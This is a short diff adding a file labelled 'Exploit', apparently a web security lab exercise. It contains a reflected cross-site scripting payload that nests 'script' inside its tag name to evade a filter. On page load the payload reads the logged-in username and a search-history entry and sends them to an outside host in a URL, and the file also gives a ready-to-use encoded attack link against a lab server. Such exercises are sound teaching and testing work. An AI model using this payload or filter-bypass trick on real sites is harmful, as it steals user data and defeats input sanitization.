@@ -1,0 +1,11 @@
+### Exploit ###
+<scrscriptipt>
+      window.onload = function() {
+      var u = document.getElementById("logged-in-user").innerText;
+      var v = document.getElementsByClassName("history-item list-group-item")[1].innerText;
+      window.open("http://www.google.com/search?q="+u+"_"+v); 	
+      }
+</scrscriptipt>
+
+
+http://172.27.16.3:33414/c011a736/search?q=%3Cscrscriptipt%3E+++++++window.onload+%3D+function%28%29+%7B+++++++var+u+%3D+document.getElementById%28%22logged-in-user%22%29.innerText%3B+++++++var+v+%3D+document.getElementsByClassName%28%22history-item+list-group-item%22%29%5B1%5D.innerText%3B+++++++window.open%28%22http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3D%22%2Bu%2B%22_%22%2Bv%29%3B+%09+++++++%7D+++++++%3C%2Fscrscriptipt%3E
